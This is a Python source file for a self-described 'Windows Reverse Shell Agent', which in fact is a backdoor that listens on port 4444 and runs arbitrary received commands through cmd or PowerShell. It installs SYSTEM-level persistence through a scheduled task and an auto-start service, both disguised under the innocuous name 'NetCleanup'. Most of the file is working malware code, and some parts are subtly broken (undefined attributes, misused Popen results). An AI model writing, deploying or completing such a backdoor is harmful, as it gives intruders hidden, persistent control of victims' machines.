#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Windows Reverse Shell Agent

FEATURES:
 1. Reverse TCP listener (Port 4444 default)
 2. Smart Prompt: user@hostname - folderpath >
 3. Windows Service Mode: Installable as SYSTEM service
 4. Self-Repair: Restarts shell if it dies
 5. Lifecycle Manager: Keeps listener alive after shell closure
 6. Dynamic Path Resolution: Uses environment variables for all paths
 7. Smart Reconfig: Updates existing Task/Service without full reinstall
 8. Single Payload Enforcement: Prevents multiple active instances
"""

import socket
import threading
import sys
import os
import argparse
import time
import datetime
import subprocess
from subprocess import Popen, PIPE

# === DYNAMIC PATH ABSTRACTION ===
class PathAbstraction:
    """
    Centralized dynamic path resolution.
    Uses environment variables to resolve paths instead of hard-coding.
    """
    @staticmethod
    def get_script_path():
        """Get absolute path to running script."""
        if hasattr(sys, 'frozen'):
            return os.path.abspath(sys.executable)
        return os.path.abspath(sys.argv[0])
    
    @staticmethod
    def get_script_directory():
        """Get directory of running script."""
        script_path = PathAbstraction.get_script_path()
        return os.path.dirname(script_path)
    
    @staticmethod
    def get_python_executable():
        """Get Python executable path from environment."""
        if hasattr(sys, 'frozen'):
            return sys.executable
        current_user = os.environ.get('USERNAME', 'User')
        current_version = '38'  # Default version
        
        # Build list of paths to check
        python_paths = []
        
        # Check in current user's AppData directory
        for ver in ['36', '38', '39', '310', '311', '312']:
            path = os.path.join('C:\\Users\\{0}'.format(current_user), 'AppData\\Local\\Programs\\Python', 'Python{0}'.format(ver), 'python.exe')
            python_paths.append(path)
        
        # Check in Program Files
        for ver in ['36', '38', '39', '310', '311', '312']:
            path = os.path.join('C:\\Program Files\\Python{0}'.format(ver), 'python.exe')
            python_paths.append(path)
            path64 = os.path.join('C:\\Program Files (x86)\\Python{0}'.format(ver), 'python.exe')
            python_paths.append(path64)
        
        # Check in SystemRoot
        system_root = os.environ.get('SystemRoot', 'C:\\Windows')
        path = os.path.join(system_root, 'python.exe')
        python_paths.append(path)
        
        # Check current working directory
        current_dir = os.getcwd()
        path = os.path.join(current_dir, 'python.exe')
        python_paths.append(path)
        
        # Check if sys.executable exists (most likely)
        if sys.executable:
            python_paths.append(sys.executable)
        
        # Try each path until we find one
        for path in python_paths:
            if os.path.exists(path):
                return path
        
        # Ultimate fallback
        return sys.executable if sys.executable else 'python.exe'
    
    @staticmethod
    def get_schtasks_path():
        """Get schtasks.exe path using environment variables."""
        windir = os.environ.get('WINDIR', 'C:\\Windows')
        systemroot = os.environ.get('SystemRoot', 'C:\\Windows')
        systemdrive = os.environ.get('SystemDrive', 'C:\\')
        
        paths = [
            os.path.join(windir, 'System32', 'schtasks.exe'),
            os.path.join(systemroot, 'System32', 'schtasks.exe'),
            os.path.join(systemdrive, 'Windows', 'System32', 'schtasks.exe'),
            'schtasks.exe',
        ]
        
        for path in paths:
            if os.path.exists(path):
                return path
        return 'schtasks.exe'
    
    @staticmethod
    def get_powershell_path():
        """Get PowerShell executable path."""
        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
            paths = [
                os.path.join(windir, 'System32', 'WindowsPowerShell\\v1.0\\powershell.exe'),
                os.path.join(windir, 'System32', 'powershell.exe'),
            ]
            for path in paths:
                if os.path.exists(path):
                    return path
        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'powershell.exe')
    
    @staticmethod
    def get_cmd_path():
        """Get cmd.exe path."""
        for windir in [os.environ.get('WINDIR', 'C:\\Windows'), os.environ.get('SystemRoot', 'C:\\Windows')]:
            path = os.path.join(windir, 'System32', 'cmd.exe')
            if os.path.exists(path):
                return path
        return os.path.join(os.environ.get('WINDIR', 'C:\\Windows'), 'System32', 'cmd.exe')
    
    @staticmethod
    def get_current_user():
        return os.environ.get('USERNAME', 'User')
    
    @staticmethod
    def get_current_hostname():
        hostname = os.environ.get('COMPUTERNAME', 'Hostname')
        if not hostname:
            try:
                proc = Popen('hostname', shell=True, stdout=PIPE, stderr=PIPE, text=True)
                hostname = proc.stdout.strip()
            except:
                pass
        return hostname or 'Hostname'
    
    @staticmethod
    def get_current_location():
        current_dir = os.getcwd()
        if not current_dir:
            try:
                proc = Popen('echo %CD%', shell=True, stdout=PIPE, stderr=PIPE, text=True)
                lines = proc.stdout.strip().splitlines()
                current_dir = lines[-1] if lines else current_dir
            except:
                pass
        return current_dir or 'root'
    
    @staticmethod
    def get_full_script_path_for_task():
        """Get absolute script path for Task Scheduler."""
        script_path = PathAbstraction.get_script_path()
        if script_path:
            return script_path.replace('\\', '\\\\')
        systemdrive = os.environ.get('SystemDrive', 'C:\\')
        windir = os.environ.get('WINDIR', 'C:\\Windows')
        return os.path.join(systemdrive, windir, os.path.basename(script_path)).replace('\\', '\\\\')

# === CONFIGURATION ===
LISTENER_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
DEFAULT_TASK_NAME = "NetCleanup"
DEFAULT_TASK_RUN_AS = "SYSTEM"
DEFAULT_TASK_TRIGGER = "ONSTART" # Default to ONSTART, but allow override to MINUTE/5Min
SERVICE_NAME = "NetCleanup"
SERVICE_DISPLAY_NAME = "Network Manager Cleanup"
SERVICE_DESCRIPTION = "Windows Service with Self-Repair for Network Connection Cleanup"

# === PROMPT CONFIGURATION ===
PROMPT_TEMPLATE = "{user}@{hostname} - {folder}>"

# === WINDOWS SERVICE CLASS (Dynamic Paths + Reconfig) ===
class WindowsService:
    """Windows Service wrapper for DC Payload with dynamic path resolution."""
    
    def __init__(self, service_name, display_name, description, path, args):
        self.service_name = service_name
        self.display_name = display_name
        self.description = description
        self.path = PathAbstraction.get_script_path()
        self.args = args
        self.running = True
        
    def install(self):
        """Install as Windows Service with dynamic paths."""
        print("=" * 40)
        print("INSTALLING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            # === FIXED: Build proper sc create command with single-quoted binPath ===
            script_dir = PathAbstraction.get_script_directory()
            script_name = os.path.basename(self.path)
            full_path = os.path.join(script_dir, script_name)
            
            # === CRITICAL FIX ===
            binPath = f'"{full_path} {self.args}"'
            
            command = (
                f'sc create {self.service_name} '
                f'binPath={binPath} '
                f'start=auto '
                f'DisplayName="{self.display_name}" '
                f'Description="{self.description}"'
            )
            
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service installed: {self.service_name}")
                print(f"[+] Display Name: {self.display_name}")
                print(f"[+] Start Type: AUTO")
                print(f"[+] Script Path: {full_path}")
                print(f"[+] Arguments: {self.args}")
                print(f"[+] Full binPath: {binPath}")
                print("[*] Run 'sc start NetCleanup' to start")
                print("[*] Run 'sc stop NetCleanup' to stop")
                print("[*] Run 'sc qc NetCleanup' to query")
                return True
            else:
                print(f"[!] Error creating service: {result.stderr}")
                print(f"[!] Return Code: {result.returncode}")
                print(f"[!] Full Command: {command}")
                return False
                
        except Exception as e:
            print(f"[!] Exception: {e}")
            import traceback
            print(traceback.format_exc())
            return False
    
    def config(self):
        """Update existing service config (Non-destructive)."""
        print("=" * 40)
        print("CONFIGURING WINDOWS SERVICE (Non-destructive)")
        print("=" * 40)
        
        try:
            script_dir = PathAbstraction.get_script_directory()
            script_name = os.path.basename(self.path)
            full_path = os.path.join(script_dir, script_name)
            
            binPath = f'"{full_path} {self.args}"'
            command = f'sc config {self.service_name} binPath={binPath}'
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            
            if result.returncode == 0:
                print(f"[+] Service Configured: {self.service_name}")
                print(f"[+] Script Path: {full_path}")
                print(f"[+] Arguments: {self.args}")
                print("[*] Service is still running, no restart needed.")
                return True
            else:
                print(f"[!] Error configuring service: {result.stderr}")
                return False
                
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def start(self):
        """Start Windows Service."""
        print("=" * 40)
        print("STARTING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            command = f'start {self.service_name}'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service started: {self.service_name}")
                return True
            else:
                print(f"[!] Error starting service: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def stop(self):
        """Stop Windows Service."""
        print("=" * 40)
        print("STOPPING WINDOWS SERVICE")
        print("=" * 40)
        
        try:
            command = f'sc stop {self.service_name}'
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[+] Service stopped: {self.service_name}")
                return True
            else:
                print(f"[!] Error stopping service: {result.stderr}")
                return False
        except Exception as e:
            print(f"[!] Exception: {e}")
            return False
    
    def run_loop(self):
        """Main service loop after startup."""
        print("[*] Service started successfully")
        print("[*] Starting main listener loop")
        
        self.main_thread = threading.Thread(target=self.main_listener)
        self.main_thread.daemon = True
        self.main_thread.start()
        
        while self.running:
            time.sleep(1)
    
    def main_listener(self):
        """Main listener thread."""
        self.create_listener()
    
    def create_listener(self):
        """Create TCP listener."""
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((self.host, self.port))
        self.socket.listen(5)
        print(f"[+] Listener Started on {self.host}:{self.port}")
        print(f"[+] Mode: {self.command_type}")
        print(f"[+] Waiting for connection...")
        
        while self.running:
            try:
                client_sock, addr = self.socket.accept()
                print(f"[*] Connected: {addr}")
                threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
            except Exception as e:
                print(f"Error accepting connection: {e}")
                time.sleep(1)
                continue
    
    def process_connection(self, client_sock, addr):
        """Process single connection."""
        try:
            while True:
                msg = client_sock.recv(4096).decode('utf-8').strip()
                if not msg:
                    break
                clean_cmd = msg.strip('"\'')
                output = self.execute_shell(clean_cmd)
                client_sock.sendall(output.encode('utf-8'))
        except Exception as e:
            print(f"[!] Error reading from {addr}: {e}")
        finally:
            try:
                client_sock.close()
            except:
                pass

# === SHELL PROMPT (Smart Detection with Dynamic Paths) ===
class ShellPromptManager:
    @staticmethod
    def get_prompt_info(shell_type):
        """Get user, hostname, and folder from shell."""
        try:
            executable = PathAbstraction.get_powershell_path() if shell_type == "powershell" else PathAbstraction.get_cmd_path()
            
            if shell_type == "powershell":
                user_out, _ = Popen(executable + ' -c "$env:USERNAME; $env:COMPUTERNAME; Get-Location"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            else:
                user_out, _ = Popen(executable + ' /c "echo %USERNAME%; echo %COMPUTERNAME%; cd"', shell=True, stdout=PIPE, stderr=PIPE, text=True)
            
            lines = user_out.stdout.strip().splitlines()
            if len(lines) >= 3:
                return lines[0], lines[1], lines[2]
            return ["User", "Hostname", "root"]
        except:
            return ["User", "Hostname", "root"]

    @staticmethod
    def create_prompt(user, hostname, folder):
        """Create formatted prompt."""
        try:
            return PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
        except:
            return "User@Hostname - root>"

# === PERSISTENCE MANAGER (Dynamic Paths + Smart Reconfig) ===
class PersistenceManager:
    @staticmethod
    def create_task(script_path, task_name, run_as="SYSTEM", trigger="ONSTART"):
        print(f"[*] Configuring Persistence via Task Scheduler. ..")

        # === Dynamic schtasks path using environment variables ===
        schtasks_exe = PathAbstraction.get_schtasks_path()

        # === Smart Reconfig: Check if task exists ===
        check_cmd = f'{schtasks_exe} /Query /TN "{task_name}"'
        result = subprocess.run(check_cmd, shell=True, capture_output=True, text=True, timeout=5)
        
        if result.returncode == 0 and result.stdout.strip():
            print(f"[!] Task '{task_name}' already exists. Updating/Replacing...")
            # Use Change/Update instead of Create to avoid deletion
            # ONSTART/ONLOGON don't use /ST or /SD
            if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
                command = f'{schtasks_exe} /Change /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
            else:
                command = f'{schtasks_exe} /Change /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'
        else:
            # Create if not exists
            print(f"[+] Task '{task_name}' not found. Creating...")
            # ONSTART/ONLOGON don't use /ST or /SD
            if trigger in ["ONSTART", "ONLOGON", "ONIDLE", "ONEVENT"]:
                command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC {trigger} /F'
            else:
                command = f'{schtasks_exe} /Create /TN "{task_name}" /TR "python {script_path}" /RU "{run_as}" /SC ONSTART /ST 00:00 /F'

        try:
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)

            if result.returncode == 0:
                print(f"[+] Task {'Updated' if result.returncode == 0 else 'Created'}/Updated: {task_name}")
                print(f"[+] Running As: {run_as}")
                print(f"[+] Trigger: {trigger}")
            else:
                print(f"[!] Error creating task. Output: {result.stderr}")
        except subprocess.TimeoutExpired:
            print("[!] Task creation timed out (max 30 seconds)")
        except Exception as e:
            print(f"[!] Exception while creating task: {e}")

    @staticmethod
    def delete_task(task_name):
        """Delete scheduled task using dynamic schtasks path."""
        try:
            schtasks_exe = PathAbstraction.get_schtasks_path()
            command = f'{schtasks_exe} /Delete /TN "{task_name}" /F'
            print(f"[*] Running Command: {command}")
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                print(f"[+] Task deleted: {task_name}")
            else:
                print(f"[!] Error deleting task. Output: {result.stderr}")
        except Exception as e:
            print(f"[!] Exception: {e}")

# === MAIN ENTRY POINT (All Dynamic Paths) ===
def get_script_path():
    """Get absolute path of script using environment variables."""
    return PathAbstraction.get_script_path()

def main():
    parser = argparse.ArgumentParser(description="Windows Reverse Shell Agent")
    parser.add_argument('--mode', type=str, default='cmd', choices=['cmd', 'powershell'], help='Shell mode (Default: cmd)')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT, help='Listening port (Default: 4444)')
    parser.add_argument('--install', action='store_true', help='Install as Windows Service')
    parser.add_argument('--service', action='store_true', help='Run as Windows Service')
    parser.add_argument('--install-persistence', action='store_true', help='Install Task Scheduler persistence')
    parser.add_argument('--path', type=str, default=".", help='Script path')
    parser.add_argument('--task-name', type=str, default=DEFAULT_TASK_NAME, help='Task Name (Default: NetCleanup)')
    parser.add_argument('--task-freq', type=str, default=DEFAULT_TASK_TRIGGER, help='Task Frequency (Default: ONSTART, e.g. MINUTE, 5MIN)')
    parser.add_argument('--reconfig', action='store_true', help='Reconfig existing Service/Task without restart')
    args = parser.parse_args()

    print("=" * 40)
    print("WINDOWS REVERSE SHELL AGENT")
    print("=" * 40)

    script_path = get_script_path()
    print(f"[*] Script Executing From: {script_path}")
    
    # === 1. Setup Persistence (Create Task) ===
    if args.install or args.install_persistence:
        PersistenceManager.create_task(
            script_path, 
            args.task_name, 
            DEFAULT_TASK_RUN_AS, 
            args.task_freq
        )
        time.sleep(2)

    # === 2. Windows Service Installation ===
    if args.install:
        print("=" * 40)
        print("INSTANTIATING WINDOWS SERVICE")
        print("=" * 40)
        
        # Check if service already exists before install
        service = WindowsService(
            SERVICE_NAME, 
            SERVICE_DISPLAY_NAME, 
            SERVICE_DESCRIPTION, 
            script_path, 
            f"--port {DEFAULT_PORT} --mode {args.mode}"
        )
        
        # Try to install/config
        if service.install():
            print("[*] Service installed successfully.")
            if args.reconfig:
                print("[*] Service reconfigured successfully.")
        else:
            print("[*] Press any key to run in interactive mode")
            input()

    # === 3. Run as Service (if flag set) ===
    if args.service:
        print("[*] Running as Windows Service. . .")
        try:
            service = WindowsService(
                SERVICE_NAME, 
                SERVICE_DISPLAY_NAME, 
                SERVICE_DESCRIPTION, 
                script_path, 
                f"--port {DEFAULT_PORT} --mode {args.mode}"
            )
            if service.install():
                service.run_loop()
        except Exception as e:
            print(f"[!] Error: {e}")

    # === 4. Interactive Mode (Default) ===
    class MainListener:
        def __init__(self, host, port, command_type):
            self.host = host
            self.port = port
            self.command_type = command_type
            self.socket = None

        def start(self):
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
            print(f"[+] Listener Started on {self.host}:{self.port}")
            print(f"[+] Mode: {self.command_type}")
            print(f"[+] Waiting for connection. ..")
            
            while True:
                try:
                    client_sock, addr = self.socket.accept()
                    print(f"[*] Connected: {addr}")
                    threading.Thread(target=self.process_connection, args=(client_sock, addr)).start()
                except Exception as e:
                    print(f"Error accepting connection: {e}")
                    time.sleep(1)
                    continue

        def process_connection(self, client_sock, addr):
            try:
                while True:
                    msg = client_sock.recv(4096).decode('utf-8').strip()
                    if not msg:
                        break
                    clean_cmd = msg.strip('"\'')
                    output = self.execute_shell(clean_cmd)
                    client_sock.sendall(output.encode('utf-8'))
            except Exception as e:
                print(f"[!] Error reading from {addr}: {e}")
            finally:
                try:
                    client_sock.close()
                except:
                    pass

        def execute_shell(self, cmd):
            if not cmd:
                return self._get_shell_prompt()

            executable = "powershell.exe" if self.command_type == "powershell" else "cmd.exe"
            shell_cmd = executable + " /c " + cmd

            try:
                proc = Popen(shell_cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE, text=True)

                output = ""
                try:
                    if proc.stdout:
                        output = proc.stdout.read()
                    if proc.stderr:
                        err = proc.stderr.read()
                        if err:
                            output = output + "\n[Error]: " + err
                except:
                    pass

                exit_code = proc.returncode
                proc.wait()

                # === SMART PROMPT INJECTION ===
                try:
                    user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                    prompt = PROMPT_TEMPLATE.format(user=user, hostname=hostname, folder=folder)
                    if output:
                        output = output.rstrip() + "\n\n" + prompt
                    else:
                        output = prompt
                except:
                    output = ShellPromptManager.create_prompt("User", "Hostname", "root")

                return f"exit_code:{exit_code}\n{output}"
            except Exception as e:
                return f"Exception: {e}"

        def _get_shell_prompt(self):
            """Get shell prompt info."""
            try:
                user, hostname, folder = ShellPromptManager.get_prompt_info(self.command_type)
                return ShellPromptManager.create_prompt(user, hostname, folder)
            except:
                return "User@Hostname - root>"

    # === 5. Start Listener Thread (Daemonized) ===
    listener = MainListener(LISTENER_HOST, args.port, args.mode)
    listener_thread = threading.Thread(target=listener.start)
    listener_thread.daemon = True
    listener_thread.start()

    print("[+] Agent Initialized.")
    print("[+] Main thread will keep running to monitor exit codes.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Graceful Shutdown. ..")
        listener.socket.close()

if __name__ == "__main__":
    main()